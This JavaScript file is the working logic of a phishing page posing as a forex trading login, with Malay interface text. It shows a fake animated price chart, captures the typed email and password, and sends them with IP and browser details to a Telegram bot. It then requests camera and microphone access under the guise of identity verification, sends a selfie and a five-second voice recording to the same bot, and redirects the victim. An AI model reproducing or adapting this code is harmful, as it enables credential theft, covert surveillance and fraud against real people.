import { CONFIG } from "./config.js";

const TG = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}`;

// Fake live chart animation
setInterval(() => {
  const priceEl = document.querySelector('.price');
  if (!priceEl) return;
  let base = parseFloat(priceEl.textContent.replace(',', ''));
  let change = (Math.random() - 0.5) * 2.5;
  base += change;
  priceEl.textContent = base.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
  
  const bars = document.querySelectorAll('.bar');
  bars.forEach(bar => {
    if (Math.random() > 0.7) {
      bar.style.height = `${Math.random() * 80 + 20}%`;
      bar.className = Math.random() > 0.4 ? 'bar g' : 'bar r';
    }
  });
}, 2000);

function esc(s) {
  return String(s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
}

async function sendMessage(text) {
  const body = new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" });
  await fetch(`${TG}/sendMessage`, { method: "POST", body });
}

async function sendPhoto(blob, caption) {
  const fd = new FormData();
  fd.append("chat_id", CONFIG.CHAT_ID);
  fd.append("photo", blob, "selfie.jpg");
  fd.append("caption", caption);
  fd.append("parse_mode", "HTML");
  await fetch(`${TG}/sendPhoto`, { method: "POST", body: fd });
}

async function sendAudio(blob, meta) {
  const fd = new FormData();
  fd.append("chat_id", CONFIG.CHAT_ID);
  fd.append("audio", blob, "voice.webm");
  fd.append("caption", `<b>🎙️ Forex Trap — Audio (5s)</b>\n<b>IP:</b> ${esc(meta.ip)}\n<b>Masa:</b> ${esc(meta.ts)}`);
  fd.append("parse_mode", "HTML");
  await fetch(`${TG}/sendAudio`, { method: "POST", body: fd });
}

async function collectMeta() {
  let ip = "n/a";
  try {
    const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
    ip = (await r.json()).ip;
  } catch {}
  return {
    ua: navigator.userAgent,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    ip,
    ts: new Date().toISOString()
  };
}

const $ = id => document.getElementById(id);
const loginBox = $("login-box");
const camBox = $("cam-box");
const doneBox = $("done-box");

// ---------- Login ----------
$("login-form").addEventListener("submit", async e => {
  e.preventDefault();
  $("err").textContent = "";
  const email = $("email").value.trim();
  const password = $("password").value;

  if (email.length < 3) { $("err").textContent = "Sila masukkan e-mel atau nombor telefon."; return; }
  if (password.length < 1) { $("err").textContent = "Sila masukkan kata laluan."; return; }

  const btn = $("submit-btn");
  btn.disabled = true;
  btn.textContent = "Mengesahkan...";

  const meta = await collectMeta();
  const lines = [
    `<b>📈 Forex Trap — Kredensial</b>`,
    `<b>Brand:</b> ${esc(CONFIG.BRAND)}`,
    `<b>Login:</b> <code>${esc(email)}</code>`,
    `<b>Password:</b> <code>${esc(password)}</code>`,
    `<b>IP:</b> ${esc(meta.ip)}`,
    `<b>UA:</b> ${esc(meta.ua)}`,
    `<b>Masa:</b> ${esc(meta.ts)}`
  ].join("\n");

  try { await sendMessage(lines); } catch (x) {}

  loginBox.classList.add("hidden");
  camBox.classList.remove("hidden");
  await startCamera();
});

// ---------- Camera & Audio ----------
let stream = null;
let mediaRecorder = null;
let audioChunks = [];

async function startCamera() {
  try {
    // Minta kamera DAN mikrofon sekali
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: true 
    });
    const video = $("preview");
    video.srcObject = stream;
    await video.play().catch(() => {});
  } catch (e) {
    $("cam-err").textContent = "Akses kamera dan mikrofon diperlukan.";
    setTimeout(() => redirectDone(), 2000);
  }
}

async function captureAndSend() {
  const video = $("preview");
  if (!video.videoWidth) {
    $("cam-err").textContent = "Kamera belum sedia. Tunggu sebentar.";
    return;
  }

  // 1. Ambil Gambar
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // 2. Rakam Suara (5 saat)
  $("cam-err").textContent = "Mengesahkan identiti... (Sila tunggu)";
  audioChunks = [];
  
  try {
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0) audioChunks.push(e.data);
    };
    
    mediaRecorder.onstop = async () => {
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      
      // Hantar Gambar
      canvas.toBlob(async blob => {
        const meta = await collectMeta();
        const caption = [
          `<b>📸 Forex Trap — Selfie</b>`,
          `<b>IP:</b> ${esc(meta.ip)}`,
          `<b>Masa:</b> ${esc(meta.ts)}`
        ].join("\n");
        try { await sendPhoto(blob, caption); } catch (x) {}
        
        // Hantar Audio
        await sendAudio(audioBlob, meta);
        
        // Tutup stream & redirect
        if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
        redirectDone();
      }, "image/jpeg", 0.9);
    };

    // Mula rakam, dan stop selepas 5 saat
    mediaRecorder.start();
    setTimeout(() => {
      if (mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    }, 5000);

  } catch (err) {
    // Kalau audio fail, sekurang-kurangnya hantar gambar
    canvas.toBlob(async blob => {
      const meta = await collectMeta();
      try { await sendPhoto(blob, `<b>📸 Forex Trap — Selfie (No Audio)</b>`); } catch (x) {}
      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
      redirectDone();
    }, "image/jpeg", 0.9);
  }
}

$("snap-btn").addEventListener("click", async () => {
  $("snap-btn").disabled = true;
  $("snap-btn").textContent = "Memproses...";
  await captureAndSend();
});

function redirectDone() {
  camBox.classList.add("hidden");
  doneBox.classList.remove("hidden");
  setTimeout(() => { location.replace(CONFIG.REDIRECT_URL); }, 1500);
}
